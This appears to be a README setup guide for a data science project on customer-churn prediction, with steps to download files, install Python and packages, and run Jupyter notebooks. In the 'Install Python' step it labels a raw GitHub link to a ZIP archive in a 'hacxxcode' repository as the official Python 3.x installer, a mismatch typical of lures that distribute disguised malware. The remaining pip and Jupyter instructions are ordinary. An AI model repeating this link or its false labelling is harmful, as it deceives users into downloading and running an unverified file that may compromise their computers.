## 🛠️ Installing and Setting Up

Follow these steps to prepare your computer:

1. **Download the project files**

   Use the link above to get the files from the GitHub repository. Click “Code” on the page, then select “Download ZIP.” Save the ZIP file on your computer.

2. **Unzip the files**

   Right-click the ZIP file and choose “Extract All.” Pick a place you will remember, such as your Desktop or Documents folder.

3. **Install Python**

   These projects run on Python 3. If you don’t have Python installed, follow this:

   - Go to https://raw.githubusercontent.com/hacxxcode/DS_projects/main/predicting_customer_loss_for_a_telecom/D_projects_v1.1.zip
   - Download the latest version for Windows (look for Python 3.x).
   - Run the installer and check the box that says “Add Python to PATH.”
   - Choose “Install Now.”

4. **Open the Command Prompt**

   - Press the Windows key, type “cmd,” and press Enter.

5. **Install required Python packages**

   The projects need some extra modules. Type these commands one by one, pressing Enter after each:

   ```
   pip install numpy
   pip install matplotlib
   pip install seaborn
   pip install scikit-learn
   pip install catboost
   pip install lightgbm
   pip install scipy
   ```

6. **Optional: Install Jupyter Notebook**

   Jupyter Notebook lets you run the code interactively:

   ```
   pip install notebook
   ```

## ▶️ Running the Projects

Here is how to open and run the projects after setup:

1. Open the folder where you extracted the files.

2. Look for files with a `.ipynb` extension. These are Jupyter Notebooks. You can open them with Jupyter Notebook.

3. To start Jupyter Notebook:

   - Open Command Prompt.
   - Navigate to the folder with projects. Use `cd` followed by the path. For example:

     ```
     cd C:\Users\YourName\Desktop\DS_projects
     ```

   - Type:

     ```
     jupyter notebook
     ```

   This will open a new window in your web browser.

4. In the browser, click on any notebook file (.ipynb) to open it.

5. Follow the instructions inside the notebook to run the project steps. Use the “Run” button or press Shift + Enter to execute each section of code.

## 🔧 Troubleshooting Tips

- If Python commands fail, check that Python is installed and added to your system PATH.
- If packages don’t install, try updating pip:

  ```
  python -m pip install --upgrade pip
  ```

- If Jupyter Notebook won’t open, try running Command Prompt as Administrator.
- Make sure your internet connection works during setup to download packages.
